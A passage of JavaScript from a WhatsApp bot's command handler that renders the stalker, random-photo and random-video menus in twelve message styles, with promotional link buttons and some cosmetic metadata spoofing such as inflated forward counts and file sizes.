video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stalkermenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner ??" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomphotomenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${randomphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomvideomenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${randomvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
